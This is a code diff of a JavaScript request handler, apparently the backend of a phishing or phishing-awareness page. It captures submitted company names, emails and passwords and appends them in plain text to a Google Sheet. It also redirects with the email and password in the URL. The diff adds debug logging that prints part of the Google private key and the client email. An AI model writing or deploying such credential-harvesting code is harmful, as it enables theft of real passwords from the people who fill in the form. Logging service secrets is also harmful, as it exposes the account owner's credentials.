@@ -27,29 +27,38 @@ export default async function handler(req, res) {
     }
 
     // --- Save to Google Sheet ---
-    try {
-      const auth = new google.auth.JWT(
-        process.env.GOOGLE_CLIENT_EMAIL,
-        null,
-        process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n'),
-        ['https://www.googleapis.com/auth/spreadsheets']
-      );
+   try {
+  const privateKey = process.env.GOOGLE_PRIVATE_KEY
+    ? process.env.GOOGLE_PRIVATE_KEY.split(String.raw`\n`).join('\n')
+    : null;
 
-      const sheets = google.sheets({ version: 'v4', auth });
+  console.log('Private key start:', process.env.GOOGLE_PRIVATE_KEY?.substring(0, 50));
+  console.log('Client email:', process.env.GOOGLE_CLIENT_EMAIL);
 
-      await sheets.spreadsheets.values.append({
-        spreadsheetId: process.env.SHEET_ID,
-        range: 'Sheet1!A:D',
-        valueInputOption: 'RAW',
-        requestBody: {
-          values: [[timestamp, company, email, password]],
-        },
-      });
-    } catch (sheetErr) {
-      console.error('Sheet error:', sheetErr.message);
-    }
+  const auth = new google.auth.JWT(
+    process.env.GOOGLE_CLIENT_EMAIL,
+    null,
+    privateKey,
+    ['https://www.googleapis.com/auth/spreadsheets']
+  );
+
+  const sheets = google.sheets({ version: 'v4', auth });
+
+  await sheets.spreadsheets.values.append({
+    spreadsheetId: process.env.SHEET_ID,
+    range: 'Sheet1!A:D',
+    valueInputOption: 'RAW',
+    requestBody: {
+      values: [[timestamp, company, email, password]],
+    },
+  });
+} catch (sheetErr) {
+  console.error('Sheet error:', sheetErr.message);
+}
 
     // Always redirect no matter what
     res.redirect(302, `/awareness.html?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`);
   }
 }
+console.log('Private key start:', process.env.GOOGLE_PRIVATE_KEY?.substring(0, 50));
+console.log('Client email:', process.env.GOOGLE_CLIENT_EMAIL);
